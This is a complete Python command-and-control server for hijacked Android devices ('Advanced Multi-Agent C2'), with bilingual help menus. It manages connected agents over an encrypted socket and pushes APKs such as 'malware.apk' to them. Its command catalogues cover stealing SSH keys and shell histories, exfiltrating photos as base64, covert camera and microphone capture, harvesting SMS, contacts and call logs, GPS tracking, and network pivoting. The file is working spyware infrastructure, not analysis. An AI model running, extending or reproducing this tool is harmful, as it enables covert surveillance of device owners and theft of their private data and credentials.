#!/usr/bin/env python3
# ============================================================
#  listener.py — Advanced Multi-Agent C2 (Android Focus)
#  Full help (AR/EN), colors, upload, persist, stats
#  FIXED: stable connection, no early disconnect
# ============================================================
import socket, os, sys, json, base64, hashlib, struct, threading, time
from datetime import datetime

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("[!] pycryptodome not installed. Run: pip install pycryptodome")
    sys.exit(1)

# ============================================================
#                        الإعدادات
# ============================================================
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 4444
SECRET_KEY = b"ChangeThisKey32BytesLong!!!!!!"
LOG_FILE = os.path.expanduser("~/c2_session.log")
# ============================================================

# ============================================================
#                        ألوان ANSI
# ============================================================
class C:
    R = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    BG_R = "\033[41m"
    BG_G = "\033[42m"
    BG_B = "\033[44m"


def colorize(text, color):
    return f"{color}{text}{C.R}"


# ============================================================
#                        التشفير
# ============================================================
def derive_key(secret):
    return hashlib.sha256(secret).digest()

KEY = derive_key(SECRET_KEY)


def encrypt(data: bytes) -> bytes:
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, 16))


def decrypt(data: bytes) -> bytes:
    iv = data[:16]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data[16:]), 16)


def send_msg(s, msg):
    if isinstance(msg, str):
        msg = msg.encode()
    enc = encrypt(msg)
    s.sendall(struct.pack("!I", len(enc)) + enc)


def recv_msg(s, timeout=None):
    """
    استقبل رسالة مشفرة بطول محدد.
    - timeout: مهلة الاستقبال (ثوانٍ)
    - يرجع None عند timeout أو انقطاع
    """
    if timeout is not None:
        s.settimeout(timeout)
    try:
        hdr = s.recv(4)
    except socket.timeout:
        return None
    except Exception:
        return None
    if not hdr or len(hdr) < 4:
        return None
    n = struct.unpack("!I", hdr)[0]
    if n == 0 or n > 10_000_000:
        return None
    buf = b""
    while len(buf) < n:
        try:
            chunk = s.recv(n - len(buf))
        except socket.timeout:
            return None
        except Exception:
            return None
        if not chunk:
            return None
        buf += chunk
    try:
        return decrypt(buf)
    except Exception:
        return None


# ============================================================
#                        سجل الجلسة
# ============================================================
LOG_LOCK = threading.Lock()


def log_session(text):
    try:
        with LOG_LOCK:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {text}\n")
    except Exception:
        pass


# ============================================================
#                        Agent Registry
# ============================================================
class Agent:
    def __init__(self, conn, addr, info):
        self.conn = conn
        self.addr = addr
        self.info = info
        self.id = None
        self.alive = True
        self.lock = threading.Lock()
        self.cmd_count = 0
        self.connected_at = time.time()
        self.last_seen = time.time()
        self.name = info.get("model") or info.get("host") or f"agent-{addr[0]}"
        if self.name.startswith("[!"):
            self.name = f"agent-{addr[0]}"

    def send(self, cmd, timeout=180):
        with self.lock:
            try:
                send_msg(self.conn, cmd)
                self.cmd_count += 1
                self.last_seen = time.time()
                result = recv_msg(self.conn, timeout=timeout)
                if result is None:
                    return "[!] no response or timeout"
                return result.decode(errors="ignore")
            except Exception as e:
                self.alive = False
                return f"[!] send error: {e}"

    def uptime(self):
        return int(time.time() - self.connected_at)


class Registry:
    def __init__(self):
        self.agents = {}
        self.next_id = 1
        self.lock = threading.Lock()

    def add(self, conn, addr, info):
        with self.lock:
            aid = self.next_id
            self.next_id += 1
            ag = Agent(conn, addr, info)
            ag.id = aid
            self.agents[aid] = ag
            return ag

    def remove(self, aid):
        with self.lock:
            self.agents.pop(aid, None)

    def get(self, aid):
        return self.agents.get(aid)

    def list(self):
        with self.lock:
            return list(self.agents.values())

    def count(self):
        with self.lock:
            return len(self.agents)


REGISTRY = Registry()
CURRENT = {"id": None}


def current_agent():
    if CURRENT["id"] is None:
        return None
    return REGISTRY.get(CURRENT["id"])


# ============================================================
#                        Help System
# ============================================================
HELP_AR = f"""
{colorize("╔══════════════════════════════════════════════════════════════╗", C.CYN)}
{colorize("║", C.CYN)}  {colorize("قائمة الأوامر — متعدد الوكلاء (عربي)", C.B + C.WHT)}                 {colorize("║", C.CYN)}
{colorize("╚══════════════════════════════════════════════════════════════╝", C.CYN)}

{colorize("【 إدارة الوكلاء 】", C.YEL)}
  agents                     → عرض كل الأجهزة المتصلة
  count                      → عدد الأجهزة المتصلة
  use <id>                   → التبديل إلى جهاز معين
  current                    → عرض الجهاز الحالي
  send <id> <cmd>            → إرسال أمر لجهاز محدد
  broadcast <cmd>            → إرسال أمر لكل الأجهزة
  kill <id>                  → قطع اتصال جهاز معين

{colorize("【 أوامر محلية 】", C.YEL)}
  help / help ar / help en   → عرض المساعدة
  help <category>            → مساعدة فئة معينة
  upload <path.apk>          → رفع APK إلى الجهاز الحالي
  getinfo                    → معلومات الجهاز الحالي
  clear                      → مسح الشاشة
  exit                       → إنهاء الجلسة
  save                       → حفظ الجلسة في ملف log

{colorize("【 الفئات 】", C.YEL)}
  info       → معلومات النظام
  files      → الملفات والمجلدات
  apps       → التطبيقات (Shizuku)
  screen     → التحكم بالشاشة
  network    → الشبكة والمسح
  api        → Termux:API
  install    → تثبيت التطبيقات
  tools      → تثبيت أدوات
  scenarios  → سيناريوهات

{colorize("【 أمثلة 】", C.YEL)}
  agents
  use 2
  send 1 shell:ls /sdcard/
  broadcast info
  kill 3
  upload /tmp/malware.apk
"""

HELP_EN = f"""
{colorize("╔══════════════════════════════════════════════════════════════╗", C.CYN)}
{colorize("║", C.CYN)}  {colorize("Command List — Multi-Agent (English)", C.B + C.WHT)}                {colorize("║", C.CYN)}
{colorize("╚══════════════════════════════════════════════════════════════╝", C.CYN)}

{colorize("【 Agent Management 】", C.YEL)}
  agents                     → List all connected devices
  count                      → Number of connected devices
  use <id>                   → Switch to a specific device
  current                    → Show current device
  send <id> <cmd>            → Send command to a specific device
  broadcast <cmd>            → Send command to ALL devices
  kill <id>                  → Disconnect a specific device

{colorize("【 Local Commands 】", C.YEL)}
  help / help ar / help en   → Show help
  help <category>            → Category help
  upload <path.apk>          → Upload APK to current device
  getinfo                    → Info about current device
  clear                      → Clear screen
  exit                       → End session
  save                       → Save session to log

{colorize("【 Categories 】", C.YEL)}
  info       → System information
  files      → Files & directories
  apps       → Applications (Shizuku)
  screen     → Screen control
  network    → Network & scanning
  api        → Termux:API
  install    → Installing applications
  tools      → Installing extra tools
  scenarios  → Practical scenarios

{colorize("【 Examples 】", C.YEL)}
  agents
  use 2
  send 1 shell:ls /sdcard/
  broadcast info
  kill 3
  upload /tmp/malware.apk
"""

CATEGORIES = {
    "info": {
        "ar": f"""
{colorize("【 معلومات النظام 】", C.YEL)}
  info
  shell:getprop ro.product.model
  shell:getprop ro.build.version.release
  shell:getprop ro.build.version.sdk
  shell:uname -a
  shell:cat /proc/cpuinfo
  shell:df -h
  shell:free -h
  shell:whoami
  shell:id
  rish_test
  shizuku
""",
        "en": f"""
{colorize("【 System Information 】", C.YEL)}
  info
  shell:getprop ro.product.model
  shell:getprop ro.build.version.release
  shell:getprop ro.build.version.sdk
  shell:uname -a
  shell:cat /proc/cpuinfo
  shell:df -h
  shell:free -h
  shell:whoami
  shell:id
  rish_test
  shizuku
""",
    },
    "files": {
        "ar": f"""
{colorize("【 الملفات 】", C.YEL)}
  cd /sdcard
  pwd
  ls
  cd DCIM
  ls
  cat file.txt
  cd ..
  tree

  shell:ls -la /sdcard/
  shell:ls -la /sdcard/DCIM/Camera/
  shell:ls -la /sdcard/Download/
  shell:find /sdcard -name "*.jpg" 2>/dev/null | head
  shell:cat ~/.bash_history
  shell:cat ~/.python_history
  shell:cat ~/.ssh/id_rsa
  shell:base64 /sdcard/DCIM/Camera/IMG_001.jpg
  shell:tar czf /sdcard/dump.tar.gz /sdcard/DCIM 2>/dev/null
  shell:base64 /sdcard/dump.tar.gz
""",
        "en": f"""
{colorize("【 Files 】", C.YEL)}
  cd /sdcard
  pwd
  ls
  cd DCIM
  ls
  cat file.txt
  cd ..
  tree

  shell:ls -la /sdcard/
  shell:ls -la /sdcard/DCIM/Camera/
  shell:ls -la /sdcard/Download/
  shell:find /sdcard -name "*.jpg" 2>/dev/null | head
  shell:cat ~/.bash_history
  shell:cat ~/.python_history
  shell:cat ~/.ssh/id_rsa
  shell:base64 /sdcard/DCIM/Camera/IMG_001.jpg
  shell:tar czf /sdcard/dump.tar.gz /sdcard/DCIM 2>/dev/null
  shell:base64 /sdcard/dump.tar.gz
""",
    },
    "apps": {
        "ar": f"""
{colorize("【 التطبيقات (Shizuku) 】", C.YEL)}
  list_apps
  rish:pm list packages -3
  rish:pm list packages -s
  rish:pm path com.whatsapp
  rish:dumpsys package com.whatsapp | head -50
  uninstall:com.example.app
  rish:pm disable-user com.example.app
  rish:pm enable com.example.app
  rish:pm clear com.example.app
""",
        "en": f"""
{colorize("【 Applications (Shizuku) 】", C.YEL)}
  list_apps
  rish:pm list packages -3
  rish:pm list packages -s
  rish:pm path com.whatsapp
  rish:dumpsys package com.whatsapp | head -50
  uninstall:com.example.app
  rish:pm disable-user com.example.app
  rish:pm enable com.example.app
  rish:pm clear com.example.app
""",
    },
    "screen": {
        "ar": f"""
{colorize("【 التحكم بالشاشة 】", C.YEL)}
  screenshot
  shell:input tap 500 1000
  shell:input swipe 500 1500 500 500
  shell:input keyevent KEYCODE_HOME
  shell:input keyevent KEYCODE_BACK
  shell:input keyevent KEYCODE_POWER
  shell:input text "hello"
  shell:am start -n com.android.chrome/com.google.android.apps.chrome.Main
  shell:am start -a android.intent.action.VIEW -d "http://192.168.8.120"
  shell:am force-stop com.example.app
""",
        "en": f"""
{colorize("【 Screen Control 】", C.YEL)}
  screenshot
  shell:input tap 500 1000
  shell:input swipe 500 1500 500 500
  shell:input keyevent KEYCODE_HOME
  shell:input keyevent KEYCODE_BACK
  shell:input keyevent KEYCODE_POWER
  shell:input text "hello"
  shell:am start -n com.android.chrome/com.google.android.apps.chrome.Main
  shell:am start -a android.intent.action.VIEW -d "http://192.168.8.120"
  shell:am force-stop com.example.app
""",
    },
    "network": {
        "ar": f"""
{colorize("【 الشبكة 】", C.YEL)}
  shell:ip a
  shell:ip route
  shell:cat /etc/resolv.conf
  shell:ss -tunp
  shell:ping -c 3 8.8.8.8
  shell:nmap -sn 192.168.8.0/24
  shell:arp-scan --localnet
  shell:nmap -sT -p 1-1000 192.168.8.1
  shell:ssh user@192.168.8.1
  shell:python -m http.server 9999 &
  shell:nc -lvnp 4444 &
""",
        "en": f"""
{colorize("【 Network 】", C.YEL)}
  shell:ip a
  shell:ip route
  shell:cat /etc/resolv.conf
  shell:ss -tunp
  shell:ping -c 3 8.8.8.8
  shell:nmap -sn 192.168.8.0/24
  shell:arp-scan --localnet
  shell:nmap -sT -p 1-1000 192.168.8.1
  shell:ssh user@192.168.8.1
  shell:python -m http.server 9999 &
  shell:nc -lvnp 4444 &
""",
    },
    "api": {
        "ar": f"""
{colorize("【 Termux:API 】", C.YEL)}
  shell:termux-battery-status
  shell:termux-location
  shell:termux-location -p gps
  shell:termux-camera-photo -c 0 /sdcard/spy.jpg
  shell:termux-camera-photo -c 1 /sdcard/selfie.jpg
  shell:termux-microphone-record -d -f /sdcard/a.m4a -l 10
  shell:termux-contact-list
  shell:termux-sms-list
  shell:termux-sms-list -l 10
  shell:termux-sms-send -n 1234567890 "hello"
  shell:termux-call-log
  shell:termux-clipboard-get
  shell:termux-clipboard-set "text"
  shell:termux-notification --title "Hi" --content "Hello"
  shell:termux-toast "hello"
  shell:termux-vibrate -d 1000
  shell:termux-torch on
  shell:termux-wifi-connectioninfo
  shell:termux-wifi-scaninfo
  shell:termux-sensor -l
""",
        "en": f"""
{colorize("【 Termux:API 】", C.YEL)}
  shell:termux-battery-status
  shell:termux-location
  shell:termux-location -p gps
  shell:termux-camera-photo -c 0 /sdcard/spy.jpg
  shell:termux-camera-photo -c 1 /sdcard/selfie.jpg
  shell:termux-microphone-record -d -f /sdcard/a.m4a -l 10
  shell:termux-contact-list
  shell:termux-sms-list
  shell:termux-sms-list -l 10
  shell:termux-sms-send -n 1234567890 "hello"
  shell:termux-call-log
  shell:termux-clipboard-get
  shell:termux-clipboard-set "text"
  shell:termux-notification --title "Hi" --content "Hello"
  shell:termux-toast "hello"
  shell:termux-vibrate -d 1000
  shell:termux-torch on
  shell:termux-wifi-connectioninfo
  shell:termux-wifi-scaninfo
  shell:termux-sensor -l
""",
    },
    "install": {
        "ar": f"""
{colorize("【 تثبيت التطبيقات 】", C.YEL)}
  install_url:http://192.168.8.120/app.apk
  install_url:https://example.com/app.apk
  upload /path/to/app.apk
  install:/sdcard/Download/app.apk
  rish:pm install -r /sdcard/Download/app.apk
  rish:pm install --user 0 -r -d /sdcard/Download/app.apk
""",
        "en": f"""
{colorize("【 Installing Apps 】", C.YEL)}
  install_url:http://192.168.8.120/app.apk
  install_url:https://example.com/app.apk
  upload /path/to/app.apk
  install:/sdcard/Download/app.apk
  rish:pm install -r /sdcard/Download/app.apk
  rish:pm install --user 0 -r -d /sdcard/Download/app.apk
""",
    },
    "tools": {
        "ar": f"""
{colorize("【 أدوات إضافية 】", C.YEL)}
  shell:pkg install nmap -y
  shell:pkg install hydra -y
  shell:pkg install sqlmap -y
  shell:pkg install nikto -y
  shell:pip install requests
  shell:pip install scapy
  shell:pip install paramiko
""",
        "en": f"""
{colorize("【 Extra Tools 】", C.YEL)}
  shell:pkg install nmap -y
  shell:pkg install hydra -y
  shell:pkg install sqlmap -y
  shell:pkg install nikto -y
  shell:pip install requests
  shell:pip install scapy
  shell:pip install paramiko
""",
    },
    "scenarios": {
        "ar": f"""
{colorize("【 سيناريوهات 】", C.YEL)}
  # سحب كل الصور
  shell:find /sdcard/DCIM -name "*.jpg" > /sdcard/list.txt
  shell:tar czf /sdcard/photos.tar.gz -T /sdcard/list.txt 2>/dev/null
  shell:base64 /sdcard/photos.tar.gz

  # تثبيت APK
  upload /tmp/malware.apk
  install_url:http://192.168.8.120:8000/app.apk

  # مسح الشبكة
  shell:nmap -sn 192.168.8.0/24

  # سحب SMS
  shell:termux-sms-list -l 50

  # تتبع الموقع
  shell:termux-location

  # Pivoting
  shell:nmap -sn 192.168.8.0/24
  shell:ssh user@192.168.8.50
""",
        "en": f"""
{colorize("【 Scenarios 】", C.YEL)}
  # Pull all photos
  shell:find /sdcard/DCIM -name "*.jpg" > /sdcard/list.txt
  shell:tar czf /sdcard/photos.tar.gz -T /sdcard/list.txt 2>/dev/null
  shell:base64 /sdcard/photos.tar.gz

  # Install APK
  upload /tmp/malware.apk
  install_url:http://192.168.8.120:8000/app.apk

  # Scan network
  shell:nmap -sn 192.168.8.0/24

  # Pull SMS
  shell:termux-sms-list -l 50

  # Track location
  shell:termux-location

  # Pivoting
  shell:nmap -sn 192.168.8.0/24
  shell:ssh user@192.168.8.50
""",
    },
}


def show_help(lang="both", category=None):
    if category:
        cat = CATEGORIES.get(category.lower())
        if not cat:
            print(f"{C.RED}[!]{C.R} Unknown category: {category}")
            print(f"{C.YEL}[i]{C.R} Available: {', '.join(CATEGORIES.keys())}")
            return
        if lang in ("ar", "both"):
            print(cat["ar"])
        if lang == "both":
            print("\n" + "=" * 62 + "\n")
        if lang in ("en", "both"):
            print(cat["en"])
        return
    if lang in ("ar", "both"):
        print(HELP_AR)
    if lang == "both":
        print("\n" + "=" * 62 + "\n")
    if lang in ("en", "both"):
        print(HELP_EN)


# ============================================================
#                        Prompt
# ============================================================
def prompt_str():
    ag = current_agent()
    n = REGISTRY.count()
    if ag:
        return f"{C.GRN}C2{C.R} [{C.CYN}{ag.id}{C.R}:{C.MAG}{ag.name[:15]}{C.R}] {C.YEL}({n}){C.R}> "
    return f"{C.GRN}C2{C.R} {C.YEL}({n}){C.R}> "


# ============================================================
#                        أوامر محلية
# ============================================================
def cmd_agents():
    ags = REGISTRY.list()
    if not ags:
        print(f"{C.RED}[!]{C.R} No agents connected")
        return
    print()
    print(colorize("╔══════════════════════════════════════════════════════════════════════╗", C.CYN))
    print(colorize(f"║  Connected Agents: {REGISTRY.count():<48} ║", C.CYN))
    print(colorize("╚══════════════════════════════════════════════════════════════════════╝", C.CYN))
    print(f"  {C.B}{'ID':<4} {'IP':<16} {'Name':<20} {'OS':<8} {'Shz':<4} {'Cmds':<6} {'Up':<6} {'Cur':<4}{C.R}")
    print(f"  {'-'*4} {'-'*16} {'-'*20} {'-'*8} {'-'*4} {'-'*6} {'-'*6} {'-'*4}")
    for ag in ags:
        model = (ag.name or "?")[:19]
        osn = ag.info.get("os", "?")[:7]
        shz = "Y" if ag.info.get("shizuku") else "N"
        cur = colorize(" * ", C.BG_G + C.B) if ag.id == CURRENT["id"] else ""
        up = f"{ag.uptime()}s"
        print(f"  {ag.id:<4} {ag.addr[0]:<16} {model:<20} {osn:<8} {shz:<4} {ag.cmd_count:<6} {up:<6}{cur}")
    print()


def cmd_use(aid):
    try:
        aid = int(aid)
    except ValueError:
        print(f"{C.RED}[!]{C.R} Invalid id")
        return
    ag = REGISTRY.get(aid)
    if not ag:
        print(f"{C.RED}[!]{C.R} Agent #{aid} not found")
        return
    CURRENT["id"] = aid
    print(f"{C.GRN}[+]{C.R} Switched to agent {colorize('#'+str(aid), C.B)} ({ag.addr[0]}) — {ag.name}")


def cmd_current():
    ag = current_agent()
    if not ag:
        print(f"{C.YEL}[i]{C.R} No current agent. Use 'agents' then 'use <id>'")
        return
    print(f"{C.GRN}[i]{C.R} Current: #{ag.id} ({ag.addr[0]}) | {ag.name} | cmds: {ag.cmd_count} | up: {ag.uptime()}s")


def cmd_kill(aid):
    try:
        aid = int(aid)
    except ValueError:
        print(f"{C.RED}[!]{C.R} Invalid id")
        return
    ag = REGISTRY.get(aid)
    if not ag:
        print(f"{C.RED}[!]{C.R} Agent #{aid} not found")
        return
    ag.alive = False
    try:
        ag.conn.shutdown(socket.SHUT_RDWR)
    except Exception:
        pass
    try:
        ag.conn.close()
    except Exception:
        pass
    REGISTRY.remove(aid)
    if CURRENT["id"] == aid:
        CURRENT["id"] = None
    print(f"{C.GRN}[+]{C.R} Killed agent #{aid}")


def cmd_send(aid, cmd):
    try:
        aid = int(aid)
    except ValueError:
        print(f"{C.RED}[!]{C.R} Invalid id")
        return
    ag = REGISTRY.get(aid)
    if not ag:
        print(f"{C.RED}[!]{C.R} Agent #{aid} not found")
        return
    print(f"{C.CYN}[>]{C.R} Sending to #{aid}: {cmd}")
    result = ag.send(cmd)
    print(result)
    log_session(f"#{aid} <- {cmd}\n{result}")


def cmd_broadcast(cmd):
    ags = REGISTRY.list()
    if not ags:
        print(f"{C.RED}[!]{C.R} No agents")
        return
    print(f"{C.CYN}[>]{C.R} Broadcasting to {len(ags)} agent(s): {cmd}\n")
    for ag in ags:
        print(colorize(f"--- Agent #{ag.id} ({ag.addr[0]}) ---", C.MAG))
        result = ag.send(cmd)
        print(result)
        log_session(f"BROADCAST to #{ag.id}: {cmd}\n{result}")
        print()


def cmd_upload(path):
    ag = current_agent()
    if not ag:
        print(f"{C.RED}[!]{C.R} No current agent. Use 'use <id>' first")
        return
    if not os.path.exists(path):
        print(f"{C.RED}[!]{C.R} File not found: {path}")
        return
    if not path.endswith(".apk"):
        print(f"{C.YEL}[!]{C.R} Must be .apk")
        return
    print(f"{C.CYN}[*]{C.R} Reading {path}...")
    with open(path, "rb") as f:
        data = base64.b64encode(f.read()).decode()
    fname = os.path.basename(path)
    size_mb = os.path.getsize(path) / (1024 * 1024)
    print(f"{C.CYN}[*]{C.R} Sending {fname} ({size_mb:.2f} MB / {len(data)} b64 chars)...")
    result = ag.send(f"install_b64:{fname}:{data}", timeout=600)
    print(result)
    log_session(f"UPLOAD {fname} to #{ag.id}\n{result}")


def cmd_save():
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n=== Session saved at {datetime.now()} ===\n")
            for ag in REGISTRY.list():
                f.write(f"Agent #{ag.id}: {ag.addr[0]} | {ag.name} | cmds: {ag.cmd_count} | up: {ag.uptime()}s\n")
        print(f"{C.GRN}[+]{C.R} Saved to {LOG_FILE}")
    except Exception as e:
        print(f"{C.RED}[!]{C.R} Save failed: {e}")


def handle_local(cmd):
    parts = cmd.split(maxsplit=1)
    c = parts[0].lower()
    rest = parts[1] if len(parts) > 1 else ""

    if c == "help":
        if not rest:
            show_help("both")
        elif rest.lower() in ("ar", "en", "both"):
            show_help(rest.lower())
        else:
            sub = rest.split()
            if len(sub) == 2 and sub[0].lower() in ("ar", "en"):
                show_help(sub[0].lower(), sub[1])
            else:
                show_help("both", rest)
        return True

    if c == "clear":
        os.system("clear" if os.name != "nt" else "cls")
        return True

    if c == "exit":
        for ag in REGISTRY.list():
            try:
                send_msg(ag.conn, "exit")
            except Exception:
                pass
        return False

    if c == "agents":
        cmd_agents()
        return True

    if c == "count":
        print(f"{C.GRN}[i]{C.R} Connected agents: {REGISTRY.count()}")
        return True

    if c == "use":
        cmd_use(rest)
        return True

    if c == "current":
        cmd_current()
        return True

    if c == "kill":
        cmd_kill(rest)
        return True

    if c == "send":
        sub = rest.split(maxsplit=1)
        if len(sub) < 2:
            print(f"{C.RED}[!]{C.R} usage: send <id> <cmd>")
            return True
        cmd_send(sub[0], sub[1])
        return True

    if c == "broadcast":
        if not rest:
            print(f"{C.RED}[!]{C.R} usage: broadcast <cmd>")
            return True
        cmd_broadcast(rest)
        return True

    if c == "upload":
        cmd_upload(rest)
        return True

    if c == "save":
        cmd_save()
        return True

    if c == "getinfo":
        ag = current_agent()
        if not ag:
            print(f"{C.RED}[!]{C.R} No current agent")
            return True
        result = ag.send("info")
        print(result)
        log_session(f"GETINFO from #{ag.id}\n{result}")
        return True

    # أمر عادي → للوكيل الحالي
    ag = current_agent()
    if not ag:
        print(f"{C.YEL}[!]{C.R} No current agent. Use 'agents' then 'use <id>'")
        return True
    print(f"{C.CYN}[>]{C.R} {cmd}")
    result = ag.send(cmd)
    print(result)
    print()
    log_session(f"#{ag.id} <- {cmd}\n{result}")
    return True


# ============================================================
#                        Agent Thread (FIXED)
# ============================================================
def agent_thread(conn, addr):
    ag = None
    try:
        # استقبل hello فقط
        hello = recv_msg(conn, timeout=15)
        info = {}
        if hello:
            try:
                info = json.loads(hello.decode())
            except Exception:
                info = {"raw": hello.decode(errors="ignore")}

        name = info.get("model") or info.get("host") or f"agent-{addr[0]}"
        if name.startswith("[!"):
            name = f"agent-{addr[0]}"

        ag = REGISTRY.add(conn, addr, info)
        ag.name = name

        print()
        print(colorize(f"[+] Agent #{ag.id} connected: {addr[0]}:{addr[1]}", C.GRN))
        print(f"    Name: {ag.name} | OS: {info.get('os', '?')} | Shizuku: {'Y' if info.get('shizuku') else 'N'}")
        print(f"    Total agents: {REGISTRY.count()}")
        print(prompt_str(), end="", flush=True)

        log_session(f"CONNECT #{ag.id} {addr[0]} {ag.name}")

        # ← لا تقرأ أي شيء — فقط انتظر حتى ينقطع الاتصال
        while ag.alive:
            time.sleep(1)
            # اختبر الاتصال بشكل سلبي
            try:
                # MSG_PEEK لا يستهلك البيانات
                conn.setblocking(False)
                try:
                    data = conn.recv(1, socket.MSG_PEEK)
                    if not data:
                        break
                except BlockingIOError:
                    pass
                except socket.error:
                    break
                finally:
                    conn.setblocking(True)
            except Exception:
                break

    except Exception as e:
        print(f"\n{C.RED}[!]{C.R} Agent thread error: {e}")
    finally:
        aid = ag.id if ag else '?'
        print(f"\n{C.RED}[-]{C.R} Agent #{aid} disconnected")
        if ag:
            REGISTRY.remove(ag.id)
            log_session(f"DISCONNECT #{ag.id}")
            if CURRENT["id"] == ag.id:
                CURRENT["id"] = None
        print(f"    Total agents: {REGISTRY.count()}")
        print(prompt_str(), end="", flush=True)
        try:
            conn.close()
        except Exception:
            pass

# ============================================================
#                        Main
# ============================================================
def banner():
    print(colorize(r"""
   ____ ___    ____  _                  _   
  / ___|__ \  |  _ \| | __ _ _   _  ___| |_ 
 | |     / /  | |_) | |/ _` | | | |/ _ \ __|
 | |___ / /_  |  __/| | (_| | |_| |  __/ |_ 
  \____|____| |_|   |_|\__,_|\__, |\___|\__|
                             |___/           
""", C.CYN))
    print(f"  {C.B}Advanced Multi-Agent C2 — Android Edition{C.R}")
    print(f"  {C.DIM}Listening on {LISTEN_HOST}:{LISTEN_PORT}{C.R}")
    print(f"  {C.DIM}Log file: {LOG_FILE}{C.R}")
    print(f"  {C.YEL}Type 'help' for full help{C.R}\n")


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((LISTEN_HOST, LISTEN_PORT))
    s.listen(10)

    banner()

    def acceptor():
        while True:
            try:
                conn, addr = s.accept()
                t = threading.Thread(target=agent_thread, args=(conn, addr), daemon=True)
                t.start()
            except Exception as e:
                print(f"{C.RED}[!]{C.R} Accept error: {e}")

    threading.Thread(target=acceptor, daemon=True).start()

    while True:
        try:
            cmd = input(prompt_str()).strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{C.YEL}[!]{C.R} Exiting")
            break
        if not cmd:
            continue
        if not handle_local(cmd):
            break


if __name__ == "__main__":
    main()